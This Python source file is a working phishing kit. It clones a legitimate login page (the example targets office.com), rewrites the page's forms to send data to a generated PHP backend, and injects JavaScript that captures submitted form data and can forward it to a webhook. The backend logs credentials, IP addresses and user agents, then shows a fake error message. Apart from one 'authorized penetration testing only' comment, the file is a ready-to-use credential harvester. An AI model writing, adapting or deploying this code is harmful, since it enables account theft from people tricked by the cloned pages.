"""
Landing Page Cloner with Credential Harvester
Clones legitimate websites and captures submitted credentials
"""

import os
import re
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from typing import Dict, Optional, List
from pathlib import Path
from loguru import logger
import json
from datetime import datetime
from cryptography.fernet import Fernet
import hashlib


class PageCloner:
    """Clone websites and inject credential harvesting functionality"""

    def __init__(
        self,
        output_dir: str = "./landing_pages",
        encryption_key: Optional[bytes] = None
    ):
        """
        Initialize the page cloner

        Args:
            output_dir: Directory to save cloned pages
            encryption_key: Key for encrypting captured credentials
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Setup encryption
        self.encryption_key = encryption_key or Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)

        # Save encryption key securely
        key_file = self.output_dir / ".encryption_key"
        if not key_file.exists():
            with open(key_file, "wb") as f:
                f.write(self.encryption_key)
            logger.info(f"Encryption key saved to {key_file}")

    def clone_page(
        self,
        target_url: str,
        harvest_method: str = "form",
        include_assets: bool = True,
        webhook_url: Optional[str] = None
    ) -> Dict:
        """
        Clone a webpage and inject credential harvesting

        Args:
            target_url: URL of the page to clone
            harvest_method: Method for harvesting (form, javascript)
            include_assets: Whether to download CSS, JS, images
            webhook_url: Optional webhook for real-time notifications

        Returns:
            Dictionary with cloning results and file paths
        """
        logger.info(f"Starting clone of {target_url}")

        try:
            # Fetch the target page
            response = requests.get(
                target_url,
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=30
            )
            response.raise_for_status()

            # Parse HTML
            soup = BeautifulSoup(response.content, 'html.parser')

            # Create unique directory for this clone
            domain = urlparse(target_url).netloc.replace('.', '_')
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            clone_dir = self.output_dir / f"{domain}_{timestamp}"
            clone_dir.mkdir(parents=True, exist_ok=True)

            # Process and save assets
            if include_assets:
                self._download_assets(soup, target_url, clone_dir)

            # Inject harvesting code
            soup = self._inject_harvester(soup, harvest_method, webhook_url)

            # Save the modified HTML
            html_file = clone_dir / "index.html"
            with open(html_file, "w", encoding="utf-8") as f:
                f.write(str(soup))

            # Create credential storage file
            creds_file = clone_dir / "credentials.json"
            with open(creds_file, "w") as f:
                json.dump({"captures": []}, f)

            # Create PHP/Python backend for credential collection
            self._create_backend(clone_dir, webhook_url)

            result = {
                "success": True,
                "target_url": target_url,
                "clone_directory": str(clone_dir),
                "html_file": str(html_file),
                "credentials_file": str(creds_file),
                "timestamp": timestamp
            }

            logger.info(f"Clone completed successfully: {clone_dir}")
            return result

        except Exception as e:
            logger.error(f"Failed to clone page: {e}")
            return {
                "success": False,
                "error": str(e),
                "target_url": target_url
            }

    def _download_assets(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
        """Download CSS, JS, and image assets"""

        # Create asset directories
        (output_dir / "css").mkdir(exist_ok=True)
        (output_dir / "js").mkdir(exist_ok=True)
        (output_dir / "images").mkdir(exist_ok=True)

        # Download CSS files
        for link in soup.find_all("link", rel="stylesheet"):
            if link.get("href"):
                self._download_asset(link["href"], base_url, output_dir / "css", link)

        # Download JavaScript files
        for script in soup.find_all("script", src=True):
            if script.get("src"):
                self._download_asset(script["src"], base_url, output_dir / "js", script)

        # Download images
        for img in soup.find_all("img", src=True):
            if img.get("src"):
                self._download_asset(img["src"], base_url, output_dir / "images", img)

    def _download_asset(self, url: str, base_url: str, output_dir: Path, element):
        """Download a single asset and update the element reference"""

        try:
            # Resolve relative URLs
            full_url = urljoin(base_url, url)

            # Skip data URLs and external resources for now
            if full_url.startswith('data:') or 'google' in full_url or 'facebook' in full_url:
                return

            # Generate filename
            filename = os.path.basename(urlparse(full_url).path) or "asset"
            if not filename.endswith(('.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg')):
                # Generate hash-based filename
                filename = hashlib.md5(full_url.encode()).hexdigest()[:16]
                if 'css' in str(output_dir):
                    filename += '.css'
                elif 'js' in str(output_dir):
                    filename += '.js'

            filepath = output_dir / filename

            # Download the asset
            response = requests.get(full_url, timeout=10)
            response.raise_for_status()

            with open(filepath, "wb") as f:
                f.write(response.content)

            # Update element reference to local path
            relative_path = f"./{output_dir.name}/{filename}"
            if element.name == "link":
                element["href"] = relative_path
            elif element.name == "script":
                element["src"] = relative_path
            elif element.name == "img":
                element["src"] = relative_path

            logger.debug(f"Downloaded asset: {filename}")

        except Exception as e:
            logger.warning(f"Failed to download asset {url}: {e}")

    def _inject_harvester(
        self,
        soup: BeautifulSoup,
        method: str,
        webhook_url: Optional[str]
    ) -> BeautifulSoup:
        """Inject credential harvesting code into the page"""

        if method == "form":
            # Find all forms and inject harvesting
            forms = soup.find_all("form")

            for form in forms:
                # Change form action to our backend
                form["action"] = "harvest.php"
                form["method"] = "post"

                # Add hidden campaign ID
                campaign_input = soup.new_tag("input")
                campaign_input["type"] = "hidden"
                campaign_input["name"] = "campaign_id"
                campaign_input["value"] = datetime.now().strftime("%Y%m%d%H%M%S")
                form.append(campaign_input)

            logger.info(f"Injected harvester into {len(forms)} forms")

        # Inject JavaScript for additional tracking
        tracking_script = soup.new_tag("script")
        tracking_script.string = self._generate_tracking_js(webhook_url)
        if soup.body:
            soup.body.append(tracking_script)

        return soup

    def _generate_tracking_js(self, webhook_url: Optional[str]) -> str:
        """Generate JavaScript for form submission tracking"""

        webhook_code = ""
        if webhook_url:
            webhook_code = f"""
            // Send notification to webhook
            fetch('{webhook_url}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    event: 'credential_captured',
                    timestamp: new Date().toISOString(),
                    data: formData
                }})
            }}).catch(e => console.log('Webhook failed'));
            """

        return f"""
        // Credential Harvesting Script
        (function() {{
            console.log('Security check initialized');

            // Intercept form submissions
            document.addEventListener('submit', function(e) {{
                const form = e.target;
                const formData = new FormData(form);
                const data = {{}};

                formData.forEach((value, key) => {{
                    data[key] = value;
                }});

                // Log credentials (in real engagement, this sends to backend)
                console.log('Form submitted:', data);

                {webhook_code}

                // Allow form to submit to our backend
                return true;
            }}, true);

            // Track input focus (identify which fields user interacts with)
            document.querySelectorAll('input').forEach(input => {{
                input.addEventListener('focus', function() {{
                    console.log('Field focused:', this.name || this.id);
                }});
            }});
        }})();
        """

    def _create_backend(self, output_dir: Path, webhook_url: Optional[str]):
        """Create backend script for credential collection"""

        # PHP backend
        php_code = f"""<?php
// Credential Harvesting Backend
// WARNING: FOR AUTHORIZED PENETRATION TESTING ONLY

header('Content-Type: application/json');

// Get POST data
$data = $_POST;
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Build credential entry
$entry = array(
    'timestamp' => $timestamp,
    'ip_address' => $ip,
    'user_agent' => $user_agent,
    'credentials' => $data
);

// Save to file
$file = 'credentials.json';
$current = json_decode(file_get_contents($file), true);
$current['captures'][] = $entry;
file_put_contents($file, json_encode($current, JSON_PRETTY_PRINT));

// Send webhook notification if configured
{"" if not webhook_url else f'''
$webhook_url = '{webhook_url}';
$webhook_data = json_encode(array(
    'event' => 'credential_captured',
    'timestamp' => $timestamp,
    'campaign' => $data['campaign_id'] ?? 'unknown'
));

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $webhook_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);
'''}

// Redirect to real site (or show fake error)
// Option 1: Redirect to legitimate site
// header('Location: https://www.microsoft.com');

// Option 2: Show fake error message
echo json_encode(array('success' => false, 'message' => 'Invalid credentials. Please try again.'));
?>
"""

        php_file = output_dir / "harvest.php"
        with open(php_file, "w") as f:
            f.write(php_code)

        logger.info(f"Created backend: {php_file}")

    def get_captured_credentials(self, clone_dir: str) -> List[Dict]:
        """Retrieve captured credentials from a cloned page"""

        creds_file = Path(clone_dir) / "credentials.json"

        if not creds_file.exists():
            return []

        try:
            with open(creds_file, "r") as f:
                data = json.load(f)
                return data.get("captures", [])
        except Exception as e:
            logger.error(f"Failed to read credentials: {e}")
            return []

    def encrypt_credentials(self, credentials: Dict) -> str:
        """Encrypt captured credentials"""
        json_data = json.dumps(credentials)
        encrypted = self.cipher.encrypt(json_data.encode())
        return encrypted.decode()

    def decrypt_credentials(self, encrypted_data: str) -> Dict:
        """Decrypt captured credentials"""
        decrypted = self.cipher.decrypt(encrypted_data.encode())
        return json.loads(decrypted.decode())


if __name__ == "__main__":
    # Example usage
    cloner = PageCloner()

    # Clone a login page
    result = cloner.clone_page(
        target_url="https://www.office.com",
        harvest_method="form",
        include_assets=True
    )

    if result["success"]:
        print(f"✓ Page cloned successfully")
        print(f"  Directory: {result['clone_directory']}")
        print(f"  HTML file: {result['html_file']}")
        print(f"  Credentials file: {result['credentials_file']}")
    else:
        print(f"✗ Clone failed: {result['error']}")
